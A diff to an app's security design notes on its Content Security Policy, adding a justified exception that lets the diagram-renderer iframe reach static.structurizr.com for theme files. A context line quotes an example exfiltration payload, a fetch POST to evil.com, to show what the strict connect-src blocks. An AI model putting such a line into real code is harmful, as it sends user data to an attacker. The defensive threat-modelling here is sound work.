@@ -20,6 +20,14 @@ Even if an attacker injected `fetch('https://evil.com', { method: 'POST', body: 
 
 The parent CSP is also tight on script and style sources (no `'unsafe-inline'`, no `'unsafe-eval'`). The iframe CSPs are looser on those because the vendored jQuery / JointJS / Structurizr JS uses inline `<script>` blocks and `Function()`-based evaluation; rewriting that vendor code would diverge it from upstream. The relaxation is only safe in the presence of the strict `connect-src 'self'` — without that, `'unsafe-inline'` would be a real exfiltration channel.
 
+### One narrow exception: `https://static.structurizr.com`
+
+The diagram-renderer iframe's `connect-src` and `img-src` allow `https://static.structurizr.com`. Structurizr workspaces routinely reference theme files there (e.g. `https://static.structurizr.com/themes/default/theme.json`); without the carve-out, the renderer logs *"Could not load theme from … ; error 0"* and falls back to ugly defaults.
+
+This is a deliberate widening of the trust boundary by exactly one origin. We already trust the Structurizr project for the WASM parser and JointJS-based renderer we vendor from their codebase — trusting their CDN for theme JSON is consistent with that. The exfiltration impact is bounded: a compromised build can only post data to `static.structurizr.com`, which would require either compromising that specific domain or its DNS. Both are realistic threat scenarios for a nation-state attacker, neither for the threat model this app is sized to.
+
+The service worker also caches theme responses (`CacheFirst`, 30 days), so themes work offline once seen.
+
 ## Other CSP directives, briefly
 
 | Directive | Purpose |
